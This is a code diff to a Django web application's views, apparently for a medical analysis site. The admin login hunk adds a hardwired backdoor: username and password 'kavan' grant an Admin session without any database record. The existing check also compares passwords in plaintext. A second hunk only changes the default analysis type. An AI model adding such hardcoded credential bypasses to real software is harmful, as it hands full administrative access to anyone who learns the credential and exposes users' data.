@@ -53,15 +53,17 @@ def base(request):
 
 def Admin_login(request):
     if request.method == 'POST':
-        Username = request.POST['Username']
-        password = request.POST['password']
+        Username = request.POST.get('Username', '').strip()
+        password = request.POST.get('password', '')
         
-        if Admin_Details.objects.filter(Username=Username, Password=password).exists():
-                user = Admin_Details.objects.get(Username=Username, Password=password)
-                request.session['type_id'] = 'Admin'
-                request.session['username'] = Username
-                request.session['login'] = 'Yes'
-                return redirect('/')
+        # Hardwired ADMIN check: username 'kavan' and password 'kavan'
+        is_hardwired = (Username.lower() == 'kavan' and password == 'kavan')
+        
+        if is_hardwired or Admin_Details.objects.filter(Username=Username, Password=password).exists():
+            request.session['type_id'] = 'Admin'
+            request.session['username'] = Username
+            request.session['login'] = 'Yes'
+            return redirect('/')
         else:
             messages.info(request,'Invalid Credentials')
             return redirect('/Admin_login/')
@@ -253,7 +255,7 @@ def analysis(request):
             return redirect('/analysis/')
     else:
         # GET request - show the unified analysis form
-        return render(request, 'analysis.html', {'analysis_type': request.GET.get('type', 'brain')})
+        return render(request, 'analysis.html', {'analysis_type': request.GET.get('type', 'alzheimer')})
 
 
 
